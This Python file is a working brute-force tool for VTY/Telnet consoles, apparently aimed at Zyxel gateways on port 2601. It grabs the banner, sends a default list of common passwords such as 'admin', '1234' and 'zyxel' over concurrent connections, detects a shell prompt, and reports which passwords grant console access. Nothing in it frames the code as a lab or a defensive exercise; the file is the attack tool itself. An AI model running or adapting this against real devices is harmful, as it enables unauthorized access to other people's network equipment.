"""
VTY Bruteforce - Attempt password-based authentication on VTY/Telnet consoles
with a list of passwords, handling connection resets and finicky protocols.
Useful for Zyxel gateways where VTY is open but may have auth enabled.
"""
import socket
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

def _try_password(target, port, username, password, timeout=10):
    """Try a single password on a VTY console."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((target, port))
        
        # Read banner/prompt
        banner = b""
        start = time.time()
        while time.time() - start < 3:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                banner += chunk
                if b"password" in banner.lower() or b"login" in banner.lower() or b"User" in banner:
                    break
            except socket.timeout:
                break
        
        banner_str = banner.decode("utf-8", errors="replace").lower()
        
        # Determine what to send based on prompt
        if b"password" in banner.lower() or b"Password" in banner:
            # Direct password prompt
            sock.sendall((password + "\r\n").encode())
        elif b"login" in banner.lower() or b"User" in banner or b"username" in banner.lower():
            # Login prompt - send username first
            sock.sendall((username + "\r\n").encode())
            time.sleep(0.5)
            # Read password prompt
            try:
                resp = sock.recv(4096)
            except:
                resp = b""
            sock.sendall((password + "\r\n").encode())
        else:
            # No auth prompt - just send password and see what happens
            sock.sendall((password + "\r\n").encode())
        
        # Read response
        time.sleep(0.5)
        resp = b""
        start = time.time()
        while time.time() - start < 3:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        
        resp_str = resp.decode("utf-8", errors="replace")
        
        # Check if we got a shell/console prompt
        has_prompt = bool(re.search(r'[\w\-.]+[>#$]\s*', resp_str))
        auth_fail = bool(re.search(r'(incorrect|wrong|invalid|failed|denied)', resp_str, re.IGNORECASE))
        
        if has_prompt and not auth_fail:
            return {"password": password, "success": True, "response": resp_str[:200]}
        elif auth_fail:
            return {"password": password, "success": False, "reason": "auth_failed"}
        else:
            # Connection might have closed - try sending a command
            try:
                sock.sendall(b"help\r\n")
                time.sleep(0.5)
                cmd_resp = sock.recv(4096).decode("utf-8", errors="replace")
                if cmd_resp.strip():
                    return {"password": password, "success": True, "response": (resp_str + cmd_resp)[:200]}
            except:
                pass
            return {"password": password, "success": False, "reason": "no_shell"}
            
    except ConnectionResetError:
        return {"password": password, "success": False, "reason": "connection_reset"}
    except socket.timeout:
        return {"password": password, "success": False, "reason": "timeout"}
    except ConnectionRefusedError:
        return {"password": password, "success": False, "reason": "refused"}
    except Exception as e:
        return {"password": password, "success": False, "reason": str(e)}
    finally:
        try:
            sock.close()
        except:
            pass


def vty_bruteforce(target: str, port: int = 2601, username: str = "admin",
                   passwords: str = "admin,1234,password,blank,root,zyxel,user,test",
                   max_workers: int = 5, timeout: int = 15) -> str:
    """
    Brute-force password authentication on a VTY console.
    
    Handles the finicky Zyxel VTY protocol where connections may reset
    or require specific handshaking. Tests each password and reports which 
    ones (if any) grant console access.
    
    Args:
        target: IP address of the target
        port: VTY port (default 2601)
        username: Username to try (for login prompts)
        passwords: Comma-separated list of passwords to try
        max_workers: Number of concurrent connection attempts
        timeout: Per-connection timeout in seconds
        
    Returns:
        Formatted results showing successful passwords and their responses
    """
    pass_list = [p.strip() for p in passwords.split(",")]
    
    results = {
        "target": f"{target}:{port}",
        "username": username,
        "attempts": len(pass_list),
        "successes": [],
        "failures": [],
        "errors": []
    }
    
    # First, do a banner grab to understand the service
    probe_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    probe_sock.settimeout(8)
    try:
        probe_sock.connect((target, port))
        probe_banner = b""
        start = time.time()
        while time.time() - start < 3:
            try:
                chunk = probe_sock.recv(4096)
                if not chunk:
                    break
                probe_banner += chunk
            except socket.timeout:
                break
        probe_sock.close()
        results["banner"] = probe_banner.decode("utf-8", errors="replace").strip()[:300]
    except Exception as e:
        results["banner"] = f"(probe failed: {e})"
    finally:
        try:
            probe_sock.close()
        except:
            pass
    
    # Try passwords
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(_try_password, target, port, username, pwd, timeout): pwd
            for pwd in pass_list
        }
        for future in as_completed(futures):
            pwd = futures[future]
            try:
                result = future.result()
                if result.get("success"):
                    results["successes"].append(result)
                elif result.get("reason") in ("connection_reset", "refused", "timeout"):
                    results["errors"].append(result)
                else:
                    results["failures"].append(result["password"])
            except Exception as e:
                results["errors"].append({"password": pwd, "reason": str(e)})
    
    # Build output
    output = []
    output.append(f"=== VTY BRUTEFORCE RESULTS ===")
    output.append(f"Target: {results['target']}")
    output.append(f"Username: {results['username']}")
    output.append(f"Passwords tested: {results['attempts']}")
    output.append(f"Banner: {results['banner']}")
    output.append("")
    
    if results["successes"]:
        output.append(f">> SUCCESS! Found {len(results['successes'])} working password(s):")
        for s in results["successes"]:
            output.append(f"  Password: '{s['password']}'")
            if s.get("response"):
                output.append(f"  Response: {s['response'][:150]}")
            output.append("")
    else:
        output.append(">> No successful passwords found.")
    
    if results["errors"]:
        output.append(f">> Connection errors ({len(results['errors'])}):")
        for e in results["errors"][:5]:
            output.append(f"  '{e['password']}': {e['reason']}")
        if len(results["errors"]) > 5:
            output.append(f"  ... and {len(results['errors'])-5} more")
    
    return "\n".join(output)
